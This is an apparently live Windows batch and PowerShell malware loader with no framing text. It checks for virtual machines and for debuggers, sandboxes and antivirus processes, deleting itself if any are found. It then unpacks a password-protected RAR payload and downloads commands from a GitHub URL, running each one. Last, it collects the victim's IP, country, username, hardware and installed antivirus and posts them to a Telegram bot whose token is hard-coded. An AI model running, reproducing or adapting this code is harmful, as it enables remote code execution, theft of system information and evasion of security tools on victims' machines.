powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "if (-not ([System.Management.ManagementObjectSearcher]::new('SELECT * FROM Win32_PortConnector').Get().Count)) { Remove-Item -Path ($env:ProgramData + '\dist') -Recurse -Force -ErrorAction SilentlyContinue; exit 1 }" || exit
setlocal EnableDelayedExpansion

if exist "%ProgramData%\AUX..\Input.exe" (
    rd /s /q "%ProgramData%\dist"
    del /f "%~f0"
    exit /b
)

set "processList=QHActiveDefense.exe QHWatchdog.exe QHSafeTray.exe PopWndLog.exe ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe SandboxieRpcSs.exe SandboxieDcomLaunch.exe httpdebuggerui.exe wireshark.exe fiddler.exe vboxservice.exe df5serv.exe vboxtray.exe vmtoolsd.exe vmwaretray.exe ida64.exe ollydbg.exe pestudio.exe vmwareuser.exe vgauthservice.exe vmacthlp.exe vmsrvc.exe x32dbg.exe x64dbg.exe x96dbg.exe vmusrvc.exe prl_cc.exe prl_tools.exe qemu-ga.exe joeboxcontrol.exe ksdumperclient.exe xenservice.exe joeboxserver.exe devenv.exe immunitydebugger.exe windbg.exe 32dbg.exe 64dbg.exe protection_id.exe scylla_x86.exe scylla_x64.exe scylla.exe idau64.exe idaq64.exe"

for %a in (%processList%) do (
    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
    if not errorlevel 1 (
        rd /s /q "%ProgramData%\dist"
        del /f "%~f0"
        exit /b
    )
)

"%ProgramData%\dist\UnRAR.exe" x -y -p147852369 "%ProgramData%\dist\75186.rar" "%ProgramData%\dist\"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/githa0/o/master/config' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"

chcp 65001 >nul
setlocal EnableDelayedExpansion

set "TOKEN=8127544875:AAEPJdvgQplbDmxCJ0IVh6Olx4HNmcPIn-8"
set "CHAT_ID=7784068582"

set "IP=Unknown"
set "Country=Unknown"
for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $json = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($json.query + '|' + $json.country) } catch { Write-Host 'Error|Error' }"') do (
    for /f "tokens=1,2 delims=|" %b in ("%a") do (
        set "IP=%b"
        set "Country=%c"
    )
)
if "%IP%"=="Unknown" set "IP=No IP"
if "%Country%"=="Unknown" set "Country=No Country"

set "Windows=Unknown"
for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $os = Get-CimInstance Win32_OperatingSystem; $ver = Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name 'DisplayVersion'; Write-Host ($os.Caption + ' ' + $os.Version + ' ' + $ver) } catch { Write-Host 'Unknown' }"') do set "Windows=%a"
if "%Windows%"=="Unknown" set "Windows=No Windows"

set "CPU=Unknown"
for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_Processor).Name } catch { Write-Host 'Unknown' }"') do set "CPU=%a"
if "%CPU%"=="Unknown" set "CPU=No CPU"

set "GPU=Unknown"
for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_VideoController).Caption } catch { Write-Host 'Unknown' }"') do set "GPU=%a"
if "%GPU%"=="Unknown" set "GPU=No GPU"

set "Arch=Unknown"
for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { if ([System.Environment]::Is64BitOperatingSystem) { Write-Host 'X64' } else { Write-Host 'X86' } } catch { Write-Host 'Unknown' }"') do set "Arch=%a"
if "%Arch%"=="Unknown" set "Arch=N/A"

set "Antivirus=No Antivirus"
for /f "tokens=*" %a in ('powershell -Command "try { $antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop; if ($antivirus) { $antivirus.displayName -join ', ' } else { 'No Antivirus' } } catch { 'No Antivirus' }"') do (
    set "Antivirus=%a"
)
if "%Antivirus%"=="No Antivirus" set "Antivirus=No Antivirus"

set "UserName=%USERNAME%"
set "Worker=%COMPUTERNAME%"

powershell -NoProfile -Command ^
  "$message = 'TRAF' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
  "[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;" ^
  "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
endlocal
